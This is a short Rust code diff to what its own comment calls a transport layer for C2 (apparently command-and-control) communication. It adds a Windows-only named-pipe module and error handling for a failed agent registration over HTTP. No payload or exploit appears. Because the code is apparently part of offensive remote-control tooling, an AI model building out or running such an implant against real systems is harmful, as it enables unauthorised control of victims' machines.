@@ -1,5 +1,8 @@
 //! Transport abstraction for C2 communication.
 
+#[cfg(target_os = "windows")]
+pub mod pipe;
+
 use std::env;
 
 use anyhow::{Context, Result};
@@ -126,6 +129,11 @@ impl HttpTransport {
 impl Transport for HttpTransport {
     async fn register(&self, url: &str, token: &str, req: &RegisterReq) -> Result<RegisterResp> {
         let resp = self.post_body(url, token, req).await?;
+        if !resp.status().is_success() {
+            let status = resp.status();
+            let text = resp.text().await.unwrap_or_default();
+            anyhow::bail!("register failed: status={} body={}", status, text);
+        }
         let reg: RegisterResp = resp.json().await?;
         Ok(reg)
     }
